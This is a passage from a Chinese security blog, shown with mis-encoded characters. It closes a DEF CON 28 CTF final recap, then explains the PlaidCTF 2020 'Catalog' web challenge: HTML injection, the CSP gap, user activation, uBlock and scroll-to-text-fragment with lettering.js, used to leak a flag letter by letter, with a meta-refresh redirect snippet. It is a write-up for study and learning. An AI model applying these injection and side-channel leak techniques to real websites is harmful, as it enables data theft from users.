é€ƒé€¸ï¼Ÿä½†æ˜¯åé¢æ‰¾äº†ä¸€ä¼šæ²¡æ‰¾åˆ°å°±æ”¾å¼ƒäº†è¿™æ¡è·¯ã€‚ï¼ˆï¼ˆå› ä¸ºæˆ‘ä»¬å½“æ—¶æƒ³ä¸‡ä¸€ OOO è¿˜åˆ«æœ‰ç”¨å¿ƒåœ°å†æ”¾ä¸€ä¸ªåé—¨åœ¨ node_modules å‘¢ï¼Ÿæ¯•ç«Ÿ Backdooor CTF\nè¿™æ¬¡è™½ç„¶ç®€å•ï¼Œä½†æ˜¯ç¡®å®ä¹Ÿè®©æˆ‘å¢åŠ äº†ä¸€äº›å¯¹äºå¦‚ä½•è®¾è®¡ AWD Web é¢˜ç›®çš„æ€è€ƒï¼ŒåŒ…æ‹¬ @Zach Wade ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ³æ³•:\n â€‹\tAlthough I might sound frustrated by this, I think itâ€™s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.\n Something Else è¿˜æœ‰ä¸€äº›æ¯”è¾ƒæœ‰æ„æ€çš„äº‹å°±æ˜¯ï¼ŒA0E çš„åŒå­¦è¯´ï¼Œæˆ‘ä»¬é˜Ÿçš„å¤§å¸ˆå‚…æ‰‹ç»• A0E å¦‚æœå†å¤šæ‰“ä¸€è½®ï¼Œé‚£ä¹ˆè¿™æ¬¡çš„ç»“æœå°±ä¸ä¸€æ ·äº†ï¼Œä¹Ÿå› ä¸ºè¿™ä¸ªä¿è¯äº†ä¸ PPP é«˜å‡ºçš„ä¸¤åˆ†çš„å·®è·ã€‚ï¼ˆè¿™éš¾é“ä¸å€¼å¾—ä¸€é¡¿é¥­å—ï¼Ÿ\næ ¹æ®ä¸€äº›ç°æœ‰çš„æŠ¥é“ï¼Œä»¥åŠå‘ä¸€äº› A0E çš„åŒå­¦è€ƒè¯ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚ä»–ä»¬çœŸçš„æ˜¯å¾ˆæ—©å°±å‡†å¤‡äº†å—ï¼ŸçœŸçš„æœ‰å¯¹æ¯ä¸ªäººåˆ†ç‰¹æ€§ï¼Œæ¯ä¸ªäººæ“…é•¿ä»€ä¹ˆå—ç­‰ç­‰é—®é¢˜ï¼Œéƒ½å¾—åˆ°äº†è‚¯å®šçš„å›ç­”ï¼Œä¸å¾—ä¸ä½©æœ A0E çš„å›¢é˜Ÿç®¡ç†åä½œèƒ½åŠ› orz è€Œä¸”æ ¹æ®ä»–ä»¬ç»“æŸå½“å¤©çš„åˆç…§æ¥çœ‹ä¼°è®¡ä¹Ÿå¾—æœ‰50å¤šäººå·¦å³å§ã€‚ï¼ˆæ®è¯´ Samurai å‚èµ›äººæ•°è¾¾åˆ°äº†ææ€–çš„150äºº\nè™½ç„¶ PPP è¡¨ç¤ºè‡ªå·± \u0026ldquo;Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.\u0026rdquo; ï¼Œä½†æ˜¯ä¹Ÿå±•ç¤ºå‡ºäº†ä¸€å¦‚æ—¢å¾€å¯¹ DEFCON çš„ç»Ÿæ²»åŠ›ã€‚\nè‡ªå·±åœ¨æ¯”èµ›çš„æ—¶å€™ç”±äºè‡ªèº«èƒ½åŠ›è¾ƒå·®ä»¥åŠç¬¬ä¸€æ¬¡è·Ÿå¤§å¸ˆå‚…ä»¬é…åˆï¼Œå½“æ—¶æ¯”èµ›é…åˆå¾—ä¸æ˜¯ç›¸å½“çš„å¥½ï¼Œå¯èƒ½å¯¼è‡´äº†ä¸€äº›å¤±åˆ†ï¼Œå¦‚æœä»¥åè¿˜æœ‰æœºä¼šï¼Œå¸Œæœ›è‡ªå·±æå‡èƒ½åŠ›çš„åŒæ—¶ï¼Œä¹Ÿèƒ½å°½é‡æé«˜ä¸€äº›åˆä½œçš„èƒ½åŠ›ã€‚\næ€»çš„æ¥è¯´ï¼Œæ³¡é¢ã€å¤–å–å¾ˆå¥½åƒï¼Œå…¬å¸åŠå…¬æ¤…å¾ˆèˆ’æœï¼Œâ€œç½‘ç®¡â€è¿ç»´é€‰æ‰‹éå¸¸ç»™åŠ›ï¼Œå¤§å¸ˆå‚…ä»¬éƒ½éå¸¸éå¸¸çš„å‰å®³ã€‚ä»Šå¹´å¯¹ä¸€å¼€å§‹çš„ KOH ä»¥åŠæœ€åçš„ Web åšäº†ä¸€ç‚¹ç‚¹å¾®å°çš„è´¡çŒ®ï¼Œå¦‚æœä»¥åæœ‰æœºä¼šçš„è¯å¸Œæœ›èƒ½åšåˆ°æ›´å¤§çš„è´¡çŒ®å­ï¼\nå†æ¬¡æ­å–œ A*0*E æ‹¿åˆ° DEFCON 28 CTF Final å† å†›ï¼\nOthers Notes PPP \u0026ndash; Zach Wade çš„å›é¡¾ï¼š Kernel Panic: A DEF CON 2020 Retrospective\nr3kapig \u0026ndash; Y1ng çš„å›é¡¾ï¼šDEFCON 28 CTF Final Safe Modeå‚èµ›è®°å½•\n","date":"2020-10-15T02:11:50Z","permalink":"https://blog.zeddyu.info/2020/10/15/Defcon28final/","title":"DEFCON 28 Final æ‚è®°"},{"content":"æœ¬æ–‡æ˜¯å…³äº Plaid CTF 2020 Catalog é¢˜ç›®çš„ä¸€äº›å¤ç›˜ä¸æ¢ç©¶ã€‚\nè¿™é“é¢˜æ˜¯æœ¬æ¬¡ PlaidCTF å…¨åœºå”¯ä¸€ä¸€é“0è§£çš„é¢˜ç›®ï¼Œå¯ä»¥è¯´æ˜¯æœ‰ä¸€å®šçš„éš¾åº¦çš„ï¼Œä¹Ÿæ¯”è¾ƒæœ‰æ„æ€ã€‚è¿™é‡Œéå¸¸æ„Ÿè°¢ @wupco @rebirthwyw @bks25wzsxï¼ˆä¼—æ‰€å‘¨çŸ¥ï¼Œ@zsx åˆå @bks25wzsxï¼‰å¸ˆå‚…ä»¬çš„æŒ‡ç‚¹ï¼Œå¤ç›˜çš„æ—¶å€™æ¯”è¾ƒè‰°éš¾ï¼Œæ•´ä¸ªæµç¨‹æˆ‘ä¼šå°½é‡ç”¨è‡ªå·±è¿˜ç®—æ¯”è¾ƒæ¸…æ™°çš„é€»è¾‘è®²ä¸€ä¸‹æœ¬é“é¢˜ï¼Œå¦‚æœå“ªé‡Œæœ‰å‡ºé”™çš„è¿˜è¯·å¸ˆå‚…ä»¬å¤šå¤šåŒ…æ¶µã€‚\nç”±äºè¿™ä¸ªé¢˜æ˜¯å¤ç›˜é¢˜ï¼Œæ‰€ä»¥åšé¢˜æ€è·¯å¯èƒ½ä¼šå°‘ä¸€äº›ï¼Œæ›´å¤šçš„æ˜¯å¯¹äºå‡ºé¢˜ç‚¹ä»¥åŠexpä¸€äº›åˆ†æä»€ä¹ˆçš„ã€‚\n{% colorquote danger %}\n5æœˆ6æ—¥æ›´æ–°ï¼šä½œè€…å·²ç»æ”¾å‡ºäº†ä»–çš„ Write Upâ€”â€”PlaidCTF 2020: Catalog Writeup ï¼Œé¢˜ç›®ä»“åº“â€”â€” catalog ï¼Œæ–‡ä¸­å†…å®¹å¯èƒ½ä¸ä½œè€… Write Up æœ‰äº›è®¸å‡ºå…¥ï¼Œè¯·ä»¥ä½œè€…çš„ Write Up ä¸ºå‡†ï¼æœ¬æ–‡æš‚æœªæ›´æ–°ï¼\n{% endcolorquote %}\nInformation  Hereâ€™s the site. The flag is on this page.\nBrowser: Chromium with uBlock Origin 1.26.0 installed and in its default configuration\nFlag format: /^PCTF\\{[A-Z0-9_]+\\}$/\nHints:\n To view your post, the admin will click on a link on the admin page. You might want to read up on User Activation. The intended solution does not require you to submit hundreds of captchas.  Hint: Admin Bot Timeout\nThe admin bot will always disconnect after about 30 seconds.\n ç»™æ²¡æœ‰çœ‹é¢˜çš„å°ä¼™ä¼´ç®€ç•¥åœ°æ¦‚æ‹¬ä¸€ä¸‹é¢˜ç›®ï¼Œé¢˜ç›®æ˜¯ä¸ªé»‘ç›’ï¼Œæœ‰ç™»å½•æ³¨å†Œã€å‘è¡¨ issue ã€æäº¤ issue ç»™ admin çœ‹ï¼Œä¸»è¦æ˜¯è¿™äº›åŠŸèƒ½ï¼Œå¾ˆæ˜æ˜¾é¢˜ç›®éœ€è¦æˆ‘ä»¬è¿›è¡Œ XSS\nå…¶ä¸­æœ‰å‡ ä¸ªç»†èŠ‚æ¼æ´ï¼š\n  ç™»å½•å¤±è´¥çš„æ—¶å€™ä¼šç›´æ¥æ— è¿‡æ»¤åœ°å›æ˜¾ç”¨æˆ·åï¼Œè¿™é‡Œæœ‰ä¸€å¤„ HTML æ³¨å…¥\n \n  åœ¨æäº¤ issue å¤„ï¼Œæœ‰ä¸€é¡¹éœ€è¦æäº¤ image URL çš„åœ°æ–¹ä¹Ÿå­˜åœ¨ç€ HTML æ³¨å…¥\n \n  é¢˜ç›®è®¾ç½®è¿˜ä¼šåˆ©ç”¨ session æ¥å­˜å‚¨ä¸€äº› HTML å…ƒç´ ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨åŒä¸€ä¸ª session å…ˆç™»å½•ï¼Œå†ç”¨è¿™ä¸ª session å‘é€ä¸€ä¸ªç™»å½•å¤±è´¥çš„è¯·æ±‚ï¼Œåˆ·æ–°æˆ‘ä»¬å·²ç™»å½•çš„é¡µé¢æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ï¼š\n \n  CSP Content-Security-Policy: default-src 'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/ é¢˜ç›®ç»™çš„ CSP æ˜¯è¿™äº›ï¼Œè¿™äº› CSP é™åˆ¶äº†æˆ‘ä»¬æ’å…¥çš„ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰è®¾ç½® base-uri ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯•å›¾åˆ©ç”¨ HTML æ³¨å…¥ç‚¹ï¼Œåˆ©ç”¨\u0026lt;base\u0026gt;æ¥è¿›è¡Œ XSS ï¼Œä½†æ˜¯å¹¶ä¸åƒ RCTF 2018 rblog é‚£é“é¢˜ï¼Œè¿™é“é¢˜çš„æ’å…¥ç‚¹åœ¨æ¯”è¾ƒé åçš„åœ°æ–¹ï¼Œæ²¡æœ‰åŠæ³•æ§åˆ¶ä¹‹å‰å¼•å…¥æ–‡ä»¶çš„ url ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•åˆ©ç”¨ base uri çš„æ€è·¯æ¥è¿›è¡Œ XSS\nExp  Catalog has two injections: the image tag on the issue page and the username when you fail to login. Use the image tag one with a meta redirect to get offsite. Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3. So now we have arbitrary content with a user activation on the correct page, but still no code exec. (\u0026hellip;the rest of the exploit to come in a moment\u0026hellip;)\n(\u0026hellip;continuation of previous post\u0026hellip;) Ok, but what can we do? A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, though this consumes the user activation. If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the \u0026lt;em\u0026gt; tag gets split into a \u0026lt;span\u0026gt; for each individual letter on load! So you can do text searches of the form #:~:text=F-,{,-X for example to search for an X at the beginning of the flag. You can specify multiple text searches to do a binary search across the whole alphabet. Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha. Repeat 5 or 6 times to get the whole flag.\n è¿™ä¸€æ®µæ˜¯èµ›å @bluepichu åœ¨ irc ä¸Šè¯´çš„ä¸€æ®µè¯ï¼Œä¹Ÿç®—æ˜¯å¯¹ catalog è¿™é“é¢˜ç›®çš„åˆ†æï¼Œä¹Ÿç®—æ˜¯ç®€çŸ­çš„ wp ã€‚\nåŒæ—¶ï¼Œ@lbherrera_ åœ¨èµ›åå‘äº†ä¸€ä¸ªæ¨ç‰¹å…¬å¼€äº†ä»–ä¸€éƒ¨åˆ†æœ¬é¢˜çš„ exp :\n{% twitter https://twitter.com/lbherrera_/status/1251994130298875904 %}\nExp åœ°å€åœ¨: https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b\nä½†æ˜¯æ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œè¯¥ä½œè€…åˆ°ç›®å‰ä¸ºæ­¢è¿˜å¹¶æœªå‘å¸ƒä»–è‡ªå·±çš„ write up ï¼Œå¦‚æœå¤§å®¶èƒ½çœ‹æ‡‚è¿™äº›ï¼Œé‚£ä¹ˆè¿™ä¸ªé¢˜åé¢çš„éƒ¨åˆ†å¤§å®¶å°±å¯ä»¥ç›´æ¥è·³è¿‡äº†ï¼Œåæ–‡ä¹Ÿå°±æ˜¯åŸºæœ¬æŒ‰ç…§è¿™ä¸ªå¤§è‡´çš„æ€è·¯æ¥åˆ†æè¿™ä¸ªé¢˜çš„ã€‚\nUser Activation è¿™éƒ¨åˆ†ç”±äºè‡ªå·±çš„ç†è§£ä¹Ÿä¸æ˜¯ç‰¹åˆ«æ·±åˆ»ï¼Œæ‰€ä»¥åªæ˜¯æ¯”è¾ƒç²—æµ…çš„ä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¿˜è¯·å¸ˆå‚…ç›´æ¥æŒ‡å‡ºã€‚\næœ¬éƒ¨åˆ†å‚è€ƒä¸»è¦æ˜¯ä¸¤ä¸ªæ–‡æ¡£ï¼šUser Activation v2ã€User Activation v2 (UAv2)ï¼Œå¦‚æœå¸ˆå‚…ä»¬å¯¹è‹±æ–‡é˜…è¯»ç†è§£æ¯”è¾ƒå¥½ï¼Œæ›´å»ºè®®çœ‹åŸæ–‡\n\u0026lsquo;User Activation\u0026rsquo; è¿™ä¸ªè¯çœ‹èµ·æ¥æ¯”è¾ƒçš„å…³é”®ï¼Œå‡ºç°åœ¨äº†ä½œè€…çš„è§£é‡Šä»¥åŠ hint å½“ä¸­ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆä½œè€…æ”¾ hint è¦ç‰¹æ„ç»™ \u0026lsquo;User Activation\u0026rsquo; è¿™ä¸ªè¯è€Œä¸æ˜¯ç›¸å¯¹äºæ›´åƒé€šä¿—çš„ \u0026lsquo;User Interaction\u0026rsquo; å‘¢ï¼Ÿ\néšä¾¿æœä¸€ä¸‹æˆ‘ä»¬å¯ä»¥çŸ¥é“ \u0026lsquo;User Activation\u0026rsquo; å…¶å®ç®—æ˜¯ä¸€ä¸ªæœ¯è¯­ï¼š\n â€‹\tUser activation is the mechanism to maintain active-user-interaction state that limits use of \u0026ldquo;abusable\u0026rdquo; APIs (e.g. opening popups or vibrating).\n ç®€è€Œè¨€ä¹‹ï¼ŒUser Activation(æˆ‘ä»¬æš‚ä¸”ç§°ä¸ºâ€œç”¨æˆ·æ¿€æ´»çŠ¶æ€â€)ï¼Œæ˜¯ä¸ºäº†ä¿æŒç”¨æˆ·ä¸»åŠ¨è¿›è¡Œäº¤äº’çš„çŠ¶æ€ï¼Œé™åˆ¶äº†ä¸€äº›è¢«æ¶æ„ä½¿ç”¨çš„ API ï¼Œæ¯”å¦‚å¼¹çª—æˆ–è€…éœ‡åŠ¨ã€‚\u0026ldquo;æ¿€æ´» \u0026ldquo;çŠ¶æ€é€šå¸¸æ„å‘³ç€ç”¨æˆ·å½“å‰é€šè¿‡æŸç§è¾“å…¥æœºåˆ¶ï¼ˆæ‰“å­—ã€ç‚¹å‡»é¼ æ ‡ç­‰ï¼‰ä¸é¡µé¢è¿›è¡Œäº¤äº’ï¼Œæˆ–è€…ç”¨æˆ·åœ¨é¡µé¢åŠ è½½åå®Œæˆäº†æŸç§äº¤äº’ã€‚\næµè§ˆå™¨é€šè¿‡ç”¨æˆ·æ¿€æ´»è¿™ç§çŠ¶æ€æ¥æ§åˆ¶å¯¹è¢«æ¶æ„ä½¿ç”¨çš„ API è®¿é—®ï¼Œè¿™ç§ API æœ€æ˜æ˜¾çš„ä¾‹å­å°±æ˜¯é€šè¿‡window.open()æ‰“å¼€å¼¹å‡ºçª—å£ã€‚å½“å‡ºç°ä¸€äº›æµæ°“å¼€å‘è€…å¼€å§‹æ¶æ„ä½¿ç”¨è¯¥ API ä»»æ„å¼¹çª—åï¼Œå¤§å¤šæ•°æµè§ˆå™¨åŠ å…¥äº†åœ¨ç”¨æˆ·æœªä¸»åŠ¨ä¸é¡µé¢äº¤äº’æ—¶é˜»æ­¢å¼¹çª—çš„åŠŸèƒ½ï¼Œä»é‚£æ—¶èµ·ï¼Œæµè§ˆå™¨é€æ¸ä½¿è®¸å¤šå…¶ä»– API ä¾èµ–äºç”¨æˆ·æ¿€æ´»ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œä½¿å®ƒä»¬å—ç”¨æˆ·æ¿€æ´»æ§åˆ¶ï¼‰ï¼Œæ¯”å¦‚å…¨å±ã€éœ‡åŠ¨ï¼Œè‡ªåŠ¨æ’­æ”¾åª’ä½“ç­‰ï¼Œ Chrome ä¸­çº¦æœ‰30ç§ä¸åŒçš„ API ç”±ç”¨æˆ·æ¿€æ´»æ§åˆ¶ã€‚\nuBlock  uBlock Origin (or uBlockâ‚€) is not an ad blocker; it\u0026rsquo;s a general-purpose blocker. uBlock Origin blocks ads through its support of the Adblock Plus filter syntax. uBlock Origin extends the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in default-deny mode, which mode will cause all 3rd-party network requests to be blocked by default, unless allowed by the user.\n ç®€å•æ¥è¯´ï¼ŒuBlock æ˜¯ä¸€ä¸ªé€šç”¨çš„ blocker ï¼Œé€šè¿‡å„ç§è‡ªå®šä¹‰è§„åˆ™æ¥é…åˆè¿‡æ»¤é¡µé¢å…ƒç´ ï¼Œæ›´å¤šçš„å¯ä»¥åˆ° uBlock ä»“åº“æŸ¥çœ‹ã€‚\nä¸ªäººä¹Ÿå¹¶æ²¡æœ‰éå¸¸ç†è§£ä½œè€…åœ¨æ­¤å¤„å¼•å…¥ uBlock çš„ç‚¹ï¼Œä»¥åŠé…åˆ User Activation çš„å‡ºé¢˜æ„å›¾ï¼Œè™½ç„¶ä½œè€…è§£é‡Šäº†ä»–çš„å‡ºé¢˜æ„å›¾ï¼š\n Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.\n å°±åœ¨æˆ‘å†™è¿™æ®µè¯çš„æ—¶å€™æˆ‘å¹¡ç„¶é†’æ‚Ÿï¼Œè¿™ä¸ª uBlock çš„å¼•å…¥å¯¹ä¼ é€’ User Activation æä¸ºé‡è¦ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿå› ä¸ºå®ƒå¯¹äºæˆ‘ä»¬æ¥ä¸‹é‡Œè¦å¼•å…¥çš„ä¸€ä¸ªæ¦‚å¿µæœ‰ç€ååˆ†é‡è¦çš„è”ç³»ï¼æ‰€ä»¥è¿™é‡Œæš‚ä¸”æˆ‘ä»¬æŠŠ uBlock + User Activation çš„æ¦‚å¿µä»¥åŠåˆ©ç”¨æ”¾ä¸€æ”¾ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çœ‹çœ‹æ€ä¹ˆè·å– flag ã€‚\nHow to get the FLAG  å­˜åœ¨ CSP é™åˆ¶ Admin ä¼šç‚¹å‡»æˆ‘ä»¬çš„ issue é“¾æ¥ Flag åœ¨åŒåŸŸçš„å¦ä¸€ä¸ªé¡µé¢ï¼šhttp://catalog.pwni.ng/issue.php?id=3  æˆ‘ä»¬å¯ä»¥ç”± 1) çŸ¥é“ï¼Œä¸€äº›åˆ©ç”¨ scirpt çš„è·³è½¬å°±å¤±æ•ˆäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹å½¢å¼è¿›è¡Œé¡µé¢è·³è½¬ï¼š\n\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;http://url/\u0026#39;\u0026#34; /\u0026gt; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ˜¯ä¸¤ä¸ª HTML æ³¨å…¥ï¼Œè€Œä¸” image url å¤„çš„æ³¨å…¥è¿˜æ˜¯å­˜å‚¨å‹çš„ã€‚\nå‡è®¾å¦‚æœå…è®¸æˆ‘ä»¬æ‰§è¡Œ script ä»£ç çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸¤ä¸ª iframe ï¼Œä¸€ä¸ª iframe æŒ‡å‘æˆ‘ä»¬å¯ä»¥æ‰§è¡Œçš„ js é¡µé¢ï¼Œå¦å¤–ä¸€ä¸ª iframe æŒ‡å‘ flag çš„é¡µé¢ï¼Œé€šè¿‡ js æ¥è·å–åŒåŸŸä¸‹çš„å¦ä¸€ä¸ª iframe çš„å†…å®¹ï¼Œè¿™ä¹Ÿç®—æ˜¯å¸¸ç”¨çš„ csrf çš„ä¸€ç§æ“ä½œï¼Œå¯ä»¥å‚è€ƒ Byte Bandits CTF 2020 - Notes App çš„è§£æ³•ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚\nå¦‚æœèƒ½æ’å…¥ script æ‰§è¡Œå°±å¥½äº†ï¼Œå¯æƒœæ’ä¸å¾—ã€‚\nText Fragments åæ‰‹çœ‹ä¸€æ‰‹ Chrome æ–°ç‰¹æ€§ï¼Œé—·å£°å‘å¤§è´¢ã€‚\nä¼—æ‰€å‘¨çŸ¥ï¼ŒCTF å‡ºé¢˜äººä¼šæœ‰äº‹æ²¡äº‹å»çœ‹çœ‹ php æºç  or chrome new features ï¼Œæ‰€ä»¥ï¼šNew in Chrome 80\n Of course, thereâ€™s plenty more!\n You can now link directly to text fragments on a page, by using #:~:text=something. Chrome will scroll to and highlight the first instance of that text fragment. For example [https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York](https://en.wikipedia.org/wiki/Rickrolling#:~:text=New York)   Scroll To Text Fragment: https://chromestatus.com/feature/4733392803332096\n â€‹\tThis feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.\n ç®€å•æ¥è¯´ï¼ŒChrome åœ¨ä»Šå¹´2æœˆä»½çš„æ›´æ–°æ¨å‡ºäº†ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œè¿™ä¸ªç‰¹æ€§èƒ½è®©æˆ‘ä»¬ç”¨å½¢å¦‚#:~:text=somethingçš„æ ·å¼æ¥æ»‘åŠ¨åˆ°è¯¥é¡µé¢somethingå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå¹¶å°†å…¶é«˜äº®ï¼Œèµ‹äºˆäº†å­—ç¬¦ä¸²ç±»ä¼¼ä¸€ä¸ª anchor é”šæ ‡ç­¾çš„ä½œç”¨ã€‚\nå…·ä½“çš„ä½¿ç”¨å¸ˆå‚…ä»¬å¯ä»¥å‚è€ƒæ–‡æ¡£ Text Fragments ï¼Œè¿™é‡Œæˆ‘åªæ‹©å–æˆ‘ä»¬éœ€è¦çš„æ¥è¯´ï¼š\n  åŒ¹é…æ¨¡å¼ï¼š\n#:~:text=[prefix-,]textStart[,textEnd][,-suffix] context |-------match-----| context   å‰ç¼€è·Ÿè·Ÿåç¼€åªæ˜¯ä¸ºäº†é™åˆ¶ä¸Šä¸‹æ–‡ï¼ŒçœŸæ­£åŒ¹é…çš„è¿˜æ˜¯ä¸­é—´çš„ textStart \u0026amp; textEnd\n  éœ€è¦å®Œæ•´åŒ¹é…ä¸€ä¸ªå•è¯ï¼Œæ— æ³•åŒ¹é…å•è¯ä¸­çš„å•ä¸ªå­—æ¯ã€‚\n Example 12\nâ€œrangeâ€ will match in â€œmountain rangeâ€ but not in â€œcolor orangeâ€ nor â€œforest rangerâ€.\n   å•è¯éœ€è¦åœ¨ä¸€ä¸ªå®Œæ•´çš„å—é‡Œé¢ï¼š\n Example 11\n:~:text=The quick,lazy dog will fail to match in\n\u0026lt;div\u0026gt;The\u0026lt;div\u0026gt; \u0026lt;/div\u0026gt;quick brown fox\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;jumped over the lazy dog\u0026lt;/div\u0026gt; because the starting string \u0026ldquo;The quick\u0026rdquo; does not appear within a single, uninterrupted block. The instance of \u0026ldquo;The quick\u0026rdquo; in the document has a block element between \u0026ldquo;The\u0026rdquo; and \u0026ldquo;quick\u0026rdquo;.\nIt does, however, match in this example:\n\u0026lt;div\u0026gt;The quick brown fox\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;jumped over the lazy dog\u0026lt;/div\u0026gt;    æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æœ‰ä¸ªæƒ³æ³•åˆ©ç”¨è¿™ä¸ªæ–°ç‰¹æ€§å»åŒ¹é…åˆ° flag ï¼Œä½†æ˜¯ä¸€ç³»åˆ—çš„é—®é¢˜æ¥äº†ï¼š\n å¦‚æœ flag æ˜¯ PCTF{TEST} ï¼Œæˆ‘ä»¬ç”¨#:~:text=P-,C,T,-Fæ˜¯åŒ¹é…ä¸åˆ°çš„ï¼Œå› ä¸ºå®ƒä¸èƒ½åŒ¹é…åˆ°å•è¯çš„å•ä¸ªå­—æ¯ å³ä½¿æˆ‘ä»¬èƒ½åŒ¹é…åˆ°äº†ï¼Œæ€ä¹ˆæ ·åˆ¤æ–­æˆ‘ä»¬åŒ¹é…åˆ°äº†å‘¢ï¼Ÿ  Lettering æŒ‰ç…§ä¸Šè¿°æ€è·¯ï¼Œæˆ‘ä»¬è²Œä¼¼å¾—æ‰¾ä¸ªåŠæ³•æ‹†åˆ†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶å®å‡ºé¢˜äººå·²ç»å¾ˆè´´å¿ƒåœ°ä¸ºæˆ‘ä»¬åšå¥½äº†ï¼š\nè¿™æ˜¯é¡µé¢æ‰€å¼•å…¥çš„æ–‡ä»¶ï¼š\n\u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js\u0026#34; nonce=\u0026#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js\u0026#34; nonce=\u0026#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y\u0026#34; nonce=\u0026#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;/js/main.js\u0026#34; nonce=\u0026#34;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; å…¶ä¸­å¼•å…¥äº† jquery.lettering.min.js ï¼Œå¹¶ä¸” main.js æœ‰å¦‚ä¸‹ä»£ç \n$(\u0026#34;em\u0026#34;).lettering(); æˆ‘ä»¬å¯ä»¥åœ¨ lettering.js çš„æ–‡æ¡£ä¸­çœ‹åˆ° Lettering.js wiki - Wrapping letters with lettering()\n We\u0026rsquo;ll start with some really basic markup:\n\u0026lt;h1 class=\u0026#34;fancy_title\u0026#34;\u0026gt;Some Title\u0026lt;/h1\u0026gt; After including jQuery, download and include the latest minified version of Lettering.js, then a script block with the magical .lettering() method:\n\u0026lt;script src=\u0026#34;path/to/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;path/to/jquery.lettering.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function() { $(\u0026#34;.fancy_title\u0026#34;).lettering(); }); \u0026lt;/script\u0026gt; The resulting code will churn your .fancy_title and output the following:\n\u0026lt;h1 class=\u0026#34;fancy_title\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;char1\u0026#34;\u0026gt;S\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char2\u0026#34;\u0026gt;o\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char3\u0026#34;\u0026gt;m\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char4\u0026#34;\u0026gt;e\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char5\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char6\u0026#34;\u0026gt;T\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char7\u0026#34;\u0026gt;i\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char8\u0026#34;\u0026gt;t\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char9\u0026#34;\u0026gt;l\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;char10\u0026#34;\u0026gt;e\u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt;  æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨é¡µé¢åŠ å…¥ä¸€ä¸ª\u0026lt;em\u0026gt;æ 